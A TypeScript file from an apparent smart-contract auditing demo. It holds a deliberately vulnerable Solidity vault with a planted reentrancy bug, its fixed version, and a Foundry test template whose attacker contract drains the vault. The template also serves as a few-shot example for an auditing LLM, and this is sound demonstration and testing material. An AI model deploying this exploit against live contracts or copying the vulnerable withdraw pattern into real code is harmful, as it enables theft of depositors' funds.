// Demo target contracts shipped with the app so judges can run the full flow instantly.

export const VULNERABLE_VAULT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// A simple ether vault. Looks fine — but withdraw() sends funds BEFORE zeroing the
/// balance, so a malicious contract can re-enter and drain every depositor.
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");
        balances[msg.sender] = 0;
    }

    function totalAssets() external view returns (uint256) {
        return address(this).balance;
    }
}
`;

export const SECURE_VAULT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// The fixed vault: checks-effects-interactions + a reentrancy guard.
contract SecureVault {
    mapping(address => uint256) public balances;
    uint256 private _locked = 1;

    modifier nonReentrant() {
        require(_locked == 1, "reentrancy");
        _locked = 2;
        _;
        _locked = 1;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");
        balances[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");
    }

    function totalAssets() external view returns (uint256) {
        return address(this).balance;
    }
}
`;

export const EXAMPLES = [
  { key: "vulnerable", title: "VulnerableVault", code: VULNERABLE_VAULT, hint: "Has a planted reentrancy bug" },
  { key: "secure", title: "SecureVault", code: SECURE_VAULT, hint: "The fixed version — agents find nothing" },
];

/// Pull the primary contract name from Solidity source (skips interface/abstract/library).
export function extractContractName(source: string): string {
  const re = /(?<!abstract\s)(?<!interface\s)(?<!library\s)\bcontract\s+([A-Za-z_]\w*)/g;
  // Simpler robust pass: find the first `contract X` that isn't preceded by interface/library.
  const lines = source.split("\n");
  for (const line of lines) {
    const m = line.match(/^\s*(?:abstract\s+)?contract\s+([A-Za-z_]\w*)/);
    if (m) return m[1];
  }
  const fallback = re.exec(source);
  return fallback ? fallback[1] : "Target";
}

/// A reentrancy proof-of-exploit template — the shape an auditor agent emits and the
/// sandbox runs. Used verbatim by demo mode and as the few-shot example for the LLM.
/// The test PASSES iff funds are actually drained, so it confirms VulnerableVault and
/// (because the guard makes the attack a no-op) fails against SecureVault.
export function reentrancyExploit(contractName: string): string {
  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {${contractName}} from "../src/Target.sol";

contract ReentrancyAttacker {
    address public vault;
    uint256 public unit;

    constructor(address _vault) { vault = _vault; }

    function attack() external payable {
        unit = msg.value;
        (bool d,) = vault.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(d, "deposit failed");
        (bool w,) = vault.call(abi.encodeWithSignature("withdraw()"));
        require(w, "withdraw failed");
    }

    receive() external payable {
        if (vault.balance >= unit) {
            vault.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}

contract Exploit is Test {
    ${contractName} target;
    address honest = makeAddr("honest");

    function setUp() public {
        target = new ${contractName}();
        vm.deal(honest, 5 ether);
        vm.prank(honest);
        (bool ok,) = address(target).call{value: 5 ether}(abi.encodeWithSignature("deposit()"));
        require(ok, "seed failed");
    }

    function test_exploit() public {
        uint256 before = address(target).balance; // 5 ether of honest funds
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(target));
        attacker.attack{value: 1 ether}();
        // PASSES only if the vault was actually drained below its honest starting balance.
        assertLt(address(target).balance, before, "not drained");
        assertEq(address(target).balance, 0, "fully drained by reentrancy");
    }
}
`;
}
